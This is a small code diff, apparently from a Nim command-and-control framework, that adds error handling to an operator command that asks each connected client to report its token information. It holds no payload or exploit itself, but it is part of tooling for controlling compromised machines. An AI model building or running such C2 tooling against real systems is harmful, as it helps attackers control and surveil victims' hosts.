@@ -2,11 +2,13 @@ import ../prelude
 
 proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
   for client in server.cli.handlingClient:  
-    # just update the token info
+
     let task = await client.sendClientTask("tokinfo")
     if not task.isNil(): 
       await task.awaitResponse()
-      logTaskOutput(task)
+      if not task.isError(): logTaskOutput(task)
+      else:
+        errorLog task.output.error
 
 let cmd*: Command = Command(
   execProc: execProc,
